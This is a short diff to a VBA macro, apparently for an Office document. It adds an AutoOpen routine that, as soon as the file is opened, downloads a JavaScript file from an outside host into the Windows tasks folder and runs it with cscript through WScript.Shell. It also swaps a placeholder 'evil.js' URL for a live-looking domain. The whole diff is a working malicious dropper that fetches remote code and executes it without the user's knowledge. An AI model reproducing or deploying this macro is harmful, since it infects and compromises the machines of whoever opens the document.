@@ -6,9 +6,16 @@ Sub Wait(n As Long)
     Loop Until Now >= DateAdd("s", n, t)
 End Sub
 
+Sub Execute()
+    Dim ret
+    Dim o
+    Set ret = VBA.CreateObject("WScript.Shell")
+    o = ret.Run("cscript c:\\windows\\tasks\\main.js")
+End Sub
+
 Sub RemoteFetch()
-    filepath = "c:\\windows\\tasks\\evil.js"
-    URL = "http://github.com/attacker/evil.js"
+    filepath = "c:\\windows\\tasks\\main.js"
+    URL = "http://g.somesec.xyz/js/main.js"
     
     Set xhr = CreateObject("Msxml2.ServerXMLHTTP.6.0")
     With xhr
@@ -27,5 +34,11 @@ Sub RemoteFetch()
         stream.Position = 0
         stream.SaveToFile (filepath)
         stream.Close
+        
+        Execute
     End If
+End Sub
+
+Sub AutoOpen()
+    RemoteFetch
 End Sub
